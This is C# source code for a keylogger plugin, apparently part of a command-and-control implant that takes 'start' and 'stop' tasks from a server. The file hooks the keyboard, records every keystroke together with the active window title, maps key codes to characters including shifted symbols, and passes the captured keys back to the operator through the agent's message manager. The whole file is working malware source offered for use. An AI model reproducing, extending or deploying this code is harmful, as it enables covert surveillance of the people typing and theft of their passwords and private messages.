using System.Collections.Concurrent;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Keystroke
    {
        public Keystroke(IntPtr hWin, int iKey)
        {
            windowHandle = hWin;
            keyCode = iKey;
        }
        public int keyCode { get; set; }
        public IntPtr windowHandle { get; set; }
        public string GetWindowTitle()
        {
            StringBuilder title = new StringBuilder(256);
            Native.GetWindowText(windowHandle, title, title.Capacity);

            if (title.Length > 0)
            {
                return title.ToString();
            }
            return string.Empty;
        }
    }

    public class Plugin : IPlugin
    {
        public string Name => "keylogger";
        private readonly object stateLock = new();
        private readonly IKeyboardHook keyboardHook;
        private KeyloggerSession? session;
        private IMessageManager messageManager { get; set; }

        private sealed class KeyloggerSession
        {
            public KeyloggerSession(string taskId, CancellationTokenSource cancellation, Action<string, string> handler)
            { TaskId = taskId; Cancellation = cancellation; Handler = handler; }
            public string TaskId { get; }
            public CancellationTokenSource Cancellation { get; }
            public Action<string, string> Handler { get; }
            public Task RunTask { get; set; } = Task.CompletedTask;
        }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
            : this(messageManager, config, logger, tokenManager, spawner, pythonManager, new NativeKeyboardHook())
        {
        }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager, IKeyboardHook keyboardHook)
        {
            this.messageManager = messageManager;
            this.keyboardHook = keyboardHook;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (!args.TryGetValue("action", out string? action))
            {
                messageManager.WriteLine("Failed to parse action.", job.task.id, true, "error");
                return;
            }

            if (action.Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                await StopAsync(job.task.id).ConfigureAwait(false);
            }
            else
            {
                Start(job.task.id);
            }

        }

        private void Start(string taskId)
        {
            KeyloggerSession current;
            lock (stateLock)
            {
                if (session is not null)
                {
                    messageManager.WriteLine("Already running", taskId, true);
                    return;
                }

                var cancellation = new CancellationTokenSource();
                Action<string, string> handler = (window, key) =>
                    messageManager.AddKeystroke(window, taskId, key);
                current = new KeyloggerSession(taskId, cancellation, handler);
                keyboardHook.KeyPressed += handler;
                session = current;
            }

            current.RunTask = RunHookAsync(current);
            messageManager.WriteLine("Keylogger started.", taskId, true);
        }

        private async Task StopAsync(string taskId)
        {
            KeyloggerSession? current;
            lock (stateLock)
            {
                current = session;
                if (current is null)
                {
                    messageManager.WriteLine("Task is not running.", taskId, true);
                    return;
                }

                current.Cancellation.Cancel();
            }
            await current.RunTask.ConfigureAwait(false);
            messageManager.WriteLine("Tasked to stop.", taskId, true);
        }

        private async Task RunHookAsync(KeyloggerSession current)
        {
            try
            {
                await keyboardHook.RunAsync(current.Cancellation.Token);
            }
            catch (OperationCanceledException) when (current.Cancellation.IsCancellationRequested)
            {
            }
            catch (Exception ex)
            {
                messageManager.WriteLine(ex.ToString(), current.TaskId, true, "error");
            }
            finally
            {
                lock (stateLock)
                {
                    keyboardHook.KeyPressed -= current.Handler;
                    if (ReferenceEquals(session, current))
                    {
                        session = null;
                    }
                }
                current.Cancellation.Dispose();
            }
        }

        internal static string ConvertKeyStroke(int ks)
        {
            string key = string.Empty;
            bool shift = (Native.GetAsyncKeyState(0x10) & 0x8000) != 0;
            bool caps = Console.CapsLock;

            // Check if Key is an alphabet letter
            if (ks > 64 && ks < 91)
            {
                if (shift | caps)
                {
                    key = ((Native.AthenaKeys)ks).ToString();
                }
                else
                {
                    key = ((Native.AthenaKeys)ks).ToString().ToLower();
                }
            }
            else
            {
                switch (ks)
                {
                    case 8:
                        key = "<Backspace>";
                        break;
                    case 9:
                        key = "<Tab>";
                        break;
                    case 13:
                        key = "<Enter>";
                        break;
                    case 32:
                        key = "<Space Bar>";
                        break;
                    case 37:
                        key = "<Left>";
                        break;
                    case 38:
                        key = "<Up>";
                        break;
                    case 39:
                        key = "<Right>";
                        break;
                    case 40:
                        key = "<Down>";
                        break;
                    case 45:
                        key = "<Insert>";
                        break;
                    case 46:
                        key = "<Delete>";
                        break;
                    case 48:
                        key = shift ? ")" : "0";
                        break;
                    case 49:
                        key = shift ? "!" : "1";
                        break;
                    case 50:
                        key = shift ? "@" : "2";
                        break;
                    case 51:
                        key = shift ? "#" : "3";
                        break;
                    case 52:
                        key = shift ? "$" : "4";
                        break;
                    case 53:
                        key = shift ? "%" : "5";
                        break;
                    case 54:
                        key = shift ? "^" : "6";
                        break;
                    case 55:
                        key = shift ? "&" : "7";
                        break;
                    case 56:
                        key = shift ? "*" : "8";
                        break;
                    case 57:
                        key = shift ? "(" : "9";
                        break;
                    case 91:
                        key = "<Windows Key>";
                        break;
                    case 92:
                        key = "<Windows Key>";
                        break;
                    case 96:
                    case 97:
                    case 98:
                    case 99:
                    case 100:
                    case 101:
                    case 102:
                    case 103:
                    case 104:
                    case 105:
                        //Convert numpad keypress
                        key = (ks - 96).ToString();
                        break;
                    case 106:
                        key = "*";
                        break;
                    case 107:
                        key = "+";
                        break;
                    case 108:
                        key = "|";
                        break;
                    case 109:
                        key = "-";
                        break;
                    case 110:
                        key = ".";
                        break;
                    case 111:
                        key = "/";
                        break;
                    case 112:
                        key = "<F1>";
                        break;
                    case 113:
                        key = "<F2>";
                        break;
                    case 114:
                        key = "<F3>";
                        break;
                    case 115:
                        key = "<F4>";
                        break;
                    case 116:
                        key = "<F5>";
                        break;
                    case 117:
                        key = "<F6>";
                        break;
                    case 118:
                        key = "<F7>";
                        break;
                    case 119:
                        key = "<F8>";
                        break;
                    case 120:
                        key = "<F9>";
                        break;
                    case 121:
                        key = "<F10>";
                        break;
                    case 122:
                        key = "<F11>";
                        break;
                    case 123:
                        key = "<F12>";
                        break;
                    case 162:
                        key = "<Ctrl>";
                        break;
                    case 163:
                        key = "<Ctrl>";
                        break;
                    case 164:
                        key = "<Alt>";
                        break;
                    case 165:
                        key = "<Alt>";
                        break;
                    case 186:
                        key = shift ? ":" : ";";
                        break;
                    case 187:
                        key = shift ? "+" : "=";
                        break;
                    case 188:
                        key = shift ? "<" : ",";
                        break;
                    case 189:
                        key = shift ? "_" : "-";
                        break;
                    case 190:
                        key = shift ? ">" : ".";
                        break;
                    case 191:
                        key = shift ? "?" : "/";
                        break;
                    case 192:
                        key = shift ? "~" : "`";
                        break;
                    case 219:
                        key = shift ? "{" : "[";
                        break;
                    case 220:
                        key = shift ? "|" : "\\";
                        break;
                    case 221:
                        key = shift ? "}" : "]";
                        break;
                    case 222:
                        key = shift ? "<Double Quote>" : "<Single Quote>";
                        break;
                }
            }

            return key;
        }
    }
}